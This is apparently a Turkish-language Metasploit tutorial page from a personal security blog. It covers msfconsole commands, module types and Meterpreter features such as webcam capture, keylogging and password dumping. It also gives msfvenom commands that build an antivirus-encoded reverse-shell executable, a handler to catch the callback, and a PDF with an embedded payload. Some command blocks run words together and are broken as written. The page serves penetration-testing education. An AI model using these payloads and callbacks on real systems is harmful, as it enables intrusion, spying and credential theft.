@@ -1,0 +1,417 @@
+<!DOCTYPE html>
+<html lang="en">
+
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>Metasploit | Neslihan Gürgen</title>
+    <link rel="stylesheet" href="/style.css">
+</head>
+
+<body>
+
+    <header class="navbar">
+
+    <nav>
+
+        <a href="/">Home</a>
+
+        <a href="/posts/">Posts</a>
+
+        <a href="/research/">Research</a>
+
+        <a href="/projects/">Projects</a>
+
+        <a href="/categories/">Categories</a>
+
+        <a href="/cheat-sheets/">Cheat Sheets</a>
+
+    </nav>
+
+</header>
+
+    <div class="page">
+
+        <aside class="sidebar">
+
+        <div class="profile-image">
+            <img src="/assets/pinguu.jpg" alt="Neslihan Gürgen">        </div>
+
+        <h1>Neslihan Gürgen</h1>
+
+        <p class="role">
+            Cybersecurity Enthusiast
+        </p>
+
+        <p class="bio">
+            Application Security |
+            Penetration Testing
+        </p>
+
+        <div class="social-links">
+            <a href="https://medium.com/@grgnes" target="_blank">Medium</a>
+            <a href="mailto:ngurgen08@gmail.com">Email</a>
+            <a href="https://github.com/grgnes" target="_blank">GitHub</a>
+            <a href="https://www.linkedin.com/in/neslihan-gurgen/" target="_blank">LinkedIn</a>
+        </div>
+
+    </aside>
+
+        <main class="content">
+            <article class="post-page">
+
+    <a class="category"
+       href="/categories/research/">
+        Research
+    </a>
+
+    <h1>Metasploit</h1>
+
+    <div class="date">
+        July 28, 2026
+    </div>
+
+    <div class="tags">
+        
+        <span>Metasploit</span>
+        
+    </div>
+
+    <div class="post-content">
+        <h2 id="metasploit-framework">Metasploit Framework</h2>
+
+<ul>
+  <li>Güvenlik açıklarını tespit etmek ve sömürmek (exploit etmek) için kullanılan bir frameworktür.</li>
+  <li>Sızma testleri ve güvenlik araştırmalarında yaygın olarak kullanılır.</li>
+</ul>
+
+<h3 id="temel-komutlar">Temel Komutlar</h3>
+
+<ul>
+  <li><code class="language-plaintext highlighter-rouge">msfconsole</code> → Metasploit konsolunu başlatır.</li>
+  <li><code class="language-plaintext highlighter-rouge">search &lt;anahtar kelime&gt;</code> → Exploit arar.</li>
+  <li><code class="language-plaintext highlighter-rouge">use &lt;exploit yolu&gt;</code> → Exploit seçer.</li>
+  <li><code class="language-plaintext highlighter-rouge">set RHOST &lt;hedef IP&gt;</code> → Hedef IP adresini belirler.</li>
+  <li><code class="language-plaintext highlighter-rouge">set PAYLOAD &lt;payload adı&gt;</code> → Payload seçer.</li>
+  <li><code class="language-plaintext highlighter-rouge">exploit</code> → İstismarı başlatır.</li>
+</ul>
+
+<h3 id="çalışma-prensibi">Çalışma Prensibi</h3>
+
+<ol>
+  <li>Hedef belirleme.</li>
+  <li>Açık portları ve servisleri tarama.</li>
+  <li>Uygun exploit seçimi.</li>
+  <li>Payload oluşturma ve hedefe gönderme.</li>
+  <li>İstismar sonrası (Post-Exploitation) işlemler.</li>
+</ol>
+
+<h2 id="temel-kavramlar">Temel Kavramlar</h2>
+
+<h3 id="meterpreter">Meterpreter</h3>
+
+<p>Meterpreter, hedef sisteme yüklenen ve saldırgan makineye geri bağlantı sağlayan gelişmiş bir payload’dır.</p>
+
+<h3 id="rhosts">RHOSTS</h3>
+
+<p><strong>Remote Host</strong>.</p>
+
+<p>Hedef sistemin IP adresidir.</p>
+
+<h3 id="rport">RPORT</h3>
+
+<p><strong>Remote Port</strong>.</p>
+
+<p>Güvenlik açığı bulunan servisin hedef sistemde çalıştığı porttur.</p>
+
+<h3 id="lhost">LHOST</h3>
+
+<p><strong>Local Host</strong>.</p>
+
+<p>Saldıran makinenin (örneğin Kali Linux) IP adresidir.</p>
+
+<h3 id="lport">LPORT</h3>
+
+<p><strong>Local Port</strong>.</p>
+
+<p>Reverse shell’in geri bağlanacağı saldırgan makinedeki porttur.</p>
+
+<p>Başka bir uygulama tarafından kullanılmayan herhangi bir port seçilebilir.</p>
+
+<h3 id="payload">PAYLOAD</h3>
+
+<p>Exploit başarılı olduktan sonra hedef sistemde çalıştırılacak koddur.</p>
+
+<h2 id="faydalı-komutlar">Faydalı Komutlar</h2>
+
+<ul>
+  <li><code class="language-plaintext highlighter-rouge">back</code> → Payload veya modülden çıkarak msfconsole’a geri döner.</li>
+  <li><code class="language-plaintext highlighter-rouge">unset all</code> → Ayarlanmış tüm parametreleri temizler.</li>
+  <li><code class="language-plaintext highlighter-rouge">setg</code> → Parametreyi diğer modüllerde de varsayılan olarak kullanılacak şekilde ayarlar.</li>
+  <li><code class="language-plaintext highlighter-rouge">exploit</code> → Exploit modüllerini çalıştırır.</li>
+  <li><code class="language-plaintext highlighter-rouge">run</code> → Tüm modüllerde kullanılabilir.</li>
+  <li><code class="language-plaintext highlighter-rouge">exploit -z</code> → Exploit’i çalıştırır ancak oturuma otomatik geçmez.</li>
+  <li><code class="language-plaintext highlighter-rouge">background</code> → Mevcut oturumu arka plana atıp msfconsole’a döner (<code class="language-plaintext highlighter-rouge">Ctrl + Z</code>).</li>
+  <li><code class="language-plaintext highlighter-rouge">sessions</code> → Mevcut oturumları listeler.</li>
+  <li><code class="language-plaintext highlighter-rouge">sessions -i 2</code> → 2 numaralı oturuma bağlanır.</li>
+</ul>
+
+<p>Metasploit modülleri:</p>
+
+<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>/usr/share/metasploit-framework/modules
+</code></pre></div></div>
+
+<hr />
+
+<h2 id="metasploit-modülleri">Metasploit Modülleri</h2>
+
+<h3 id="1-exploit-modules">1. Exploit Modules</h3>
+
+<p><strong>Amaç:</strong></p>
+
+<p>Hedef sistemde bulunan güvenlik açıklarını sömürmek.</p>
+
+<p><strong>Örnek Kullanım:</strong></p>
+
+<p>Hedef sistemdeki belirli bir serviste bulunan bilinen bir açığı çalıştırır.</p>
+
+<p><strong>Örnek Modüller:</strong></p>
+
+<ul>
+  <li><code class="language-plaintext highlighter-rouge">exploit/windows/smb/ms17_010_eternalblue</code></li>
+  <li><code class="language-plaintext highlighter-rouge">exploit/unix/ftp/proftpd_modcopy_exec</code></li>
+</ul>
+
+<h3 id="2-payload-modules">2. Payload Modules</h3>
+
+<p><strong>Amaç:</strong></p>
+
+<p>Exploit başarılı olduktan sonra çalıştırılacak kodu belirlemek.</p>
+
+<h4 id="türleri">Türleri</h4>
+
+<ul>
+  <li><strong>Single</strong> → Tek işlem gerçekleştirir.</li>
+  <li><strong>Stager</strong> → Hedefle bağlantıyı kurar ve Stage’i indirir.</li>
+  <li><strong>Stage</strong> → Stager tarafından indirilen asıl payload’dır.</li>
+</ul>
+
+<p><strong>Örnekler</strong></p>
+
+<ul>
+  <li><code class="language-plaintext highlighter-rouge">windows/meterpreter/reverse_tcp</code></li>
+  <li><code class="language-plaintext highlighter-rouge">cmd/unix/reverse_bash</code></li>
+</ul>
+
+<h3 id="3-auxiliary-modules">3. Auxiliary Modules</h3>
+
+<p><strong>Amaç:</strong></p>
+
+<p>Exploit kullanmadan bilgi toplamak veya servislerle etkileşim kurmak.</p>
+
+<p><strong>Örnek Kullanımlar</strong></p>
+
+<ul>
+  <li>Açık taraması</li>
+  <li>Brute-force saldırıları</li>
+  <li>Servis analizi</li>
+</ul>
+
+<p><strong>Örnek Modüller</strong></p>
+
+<ul>
+  <li><code class="language-plaintext highlighter-rouge">auxiliary/scanner/ftp/ftp_version</code></li>
+  <li><code class="language-plaintext highlighter-rouge">auxiliary/scanner/http/http_login</code></li>
+  <li><code class="language-plaintext highlighter-rouge">auxiliary/server/browser_autopwn2</code></li>
+</ul>
+
+<h3 id="4-post-modules">4. Post Modules</h3>
+
+<p><strong>Amaç:</strong></p>
+
+<p>Sisteme başarıyla sızıldıktan sonra gerçekleştirilen işlemler.</p>
+
+<p><strong>Örnek İşlevler</strong></p>
+
+<ul>
+  <li>Şifre dökümü</li>
+  <li>Sistem bilgisi toplama</li>
+  <li>Dosya yükleme</li>
+  <li>Dosya indirme</li>
+</ul>
+
+<p><strong>Örnek Modüller</strong></p>
+
+<ul>
+  <li><code class="language-plaintext highlighter-rouge">post/windows/gather/enum_chrome</code></li>
+  <li><code class="language-plaintext highlighter-rouge">post/linux/manage/download_exec</code></li>
+</ul>
+
+<h3 id="5-encoder-modules">5. Encoder Modules</h3>
+
+<p><strong>Amaç:</strong></p>
+
+<p>Payload’ları antivirüs veya güvenlik yazılımlarına yakalanmaması için encode etmek.</p>
+
+<p><strong>Örnekler</strong></p>
+
+<ul>
+  <li><code class="language-plaintext highlighter-rouge">x86/shikata_ga_nai</code></li>
+  <li><code class="language-plaintext highlighter-rouge">cmd/powershell_base64</code></li>
+</ul>
+
+<h3 id="6-nop-modules">6. NOP Modules</h3>
+
+<p><strong>Amaç:</strong></p>
+
+<p>Exploit koduna NOP komutları ekleyerek exploit’in daha kararlı çalışmasını sağlamak.</p>
+
+<p><strong>Örnek</strong></p>
+
+<ul>
+  <li><code class="language-plaintext highlighter-rouge">x86/single_byte</code></li>
+</ul>
+
+<h2 id="meterpreter-1">Meterpreter</h2>
+
+<ul>
+  <li>Meterpreter, Metasploit Framework’ün bir parçasıdır.</li>
+  <li>Exploit sonrası (Post-Exploitation) işlemler için kullanılan güçlü bir payload’dır.</li>
+</ul>
+
+<h3 id="kullanımı">Kullanımı</h3>
+
+<h3 id="payload-oluşturma-msfvenom">Payload oluşturma (msfvenom)</h3>
+
+<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>msfvenom-p windows/meterpreter/reverse_tcp \LHOST=192.168.1.100 \LPORT=4444 \-f exe \-o payload.exe
+</code></pre></div></div>
+
+<h3 id="handler-ayarlama">Handler ayarlama</h3>
+
+<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>msfconsole
+
+use exploit/multi/handlerset payload windows/meterpreter/reverse_tcpset LHOST192.168.1.100set LPORT4444
+
+exploit
+</code></pre></div></div>
+
+<h2 id="temel-özellikleri">Temel Özellikleri</h2>
+
+<ul>
+  <li>Hafif yapıdadır.</li>
+  <li>Bellek içerisinde çalışır.</li>
+  <li>Dosya sistemine erişebilir.</li>
+  <li>Ekran görüntüsü alabilir.</li>
+  <li>Kameraya erişebilir.</li>
+  <li>Keylogger çalıştırabilir.</li>
+  <li>Şifre dökümü yapabilir.</li>
+  <li>Ağ keşfi gerçekleştirebilir.</li>
+</ul>
+
+<h2 id="temel-komutlar-1">Temel Komutlar</h2>
+
+<h3 id="session-i̇şlemleri">Session İşlemleri</h3>
+
+<ul>
+  <li>Session başlatma → <code class="language-plaintext highlighter-rouge">meterpreter &gt;</code></li>
+  <li>Session’ları listeleme → <code class="language-plaintext highlighter-rouge">sessions -l</code></li>
+  <li>Session’a bağlanma → <code class="language-plaintext highlighter-rouge">sessions -i &lt;ID&gt;</code></li>
+</ul>
+
+<hr />
+
+<h3 id="bilgi-toplama">Bilgi Toplama</h3>
+
+<ul>
+  <li>Sistem bilgisi → <code class="language-plaintext highlighter-rouge">sysinfo</code></li>
+  <li>Ağ yapılandırması → <code class="language-plaintext highlighter-rouge">ipconfig</code></li>
+  <li>Çalışan işlemler → <code class="language-plaintext highlighter-rouge">ps</code></li>
+  <li>Ekran görüntüsü → <code class="language-plaintext highlighter-rouge">screenshot</code></li>
+  <li>Kamera görüntüsü alma → <code class="language-plaintext highlighter-rouge">webcam_snap</code></li>
+  <li>Kamerayı başlatma → <code class="language-plaintext highlighter-rouge">webcam_stream</code></li>
+</ul>
+
+<hr />
+
+<h2 id="pdfe-payload-yerleştirme">PDF’e Payload Yerleştirme</h2>
+
+<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>msfconsole
+
+use exploit/windows/fileformat/
+
+use exploit/windows/fileformat/adobe_pdf_embedded_exe
+
+show options
+</code></pre></div></div>
+
+<p><code class="language-plaintext highlighter-rouge">INFILENAME</code> parametresine PDF dosyasının yolu gösterilir.</p>
+
+<p>PDF oluşturulduktan sonra:</p>
+
+<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>msfconsole
+
+use exploit/multi/handler
+
+show options
+
+set payload windows/meterpreter/reverse_tcp
+
+run
+</code></pre></div></div>
+
+<p>Dinleme başlar.</p>
+
+<p>Hedef payload’ı çalıştırdığında Meterpreter oturumu açılır.</p>
+
+<h2 id="msfvenom-kullanımı">MSFVENOM Kullanımı</h2>
+
+<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>msfvenom
+
+-p windows/meterpreter/reverse_tcp
+
+--platform windows
+
+-a x86
+
+-e x86/shikata_ga_nai
+
+-b "\x00"
+
+LHOST=192.168.192.136
+
+-f exe
+
+&gt; /home/kali/Desktop/evil.exe
+</code></pre></div></div>
+
+<h3 id="handler-başlatma">Handler Başlatma</h3>
+
+<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>msfconsole -q
+
+use exploit/multi/handler
+
+set payload windows/meterpreter/reverse_tcp
+
+show options
+
+run
+</code></pre></div></div>
+
+<p>Bağlantı geldikten sonra:</p>
+
+<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>meterpreter &gt;
+</code></pre></div></div>
+
+    </div>
+
+</article>
+        </main>
+
+    </div>
+
+    <footer>
+    © 2026 Neslihan Gürgen
+</footer>
+
+</body>
+</html>
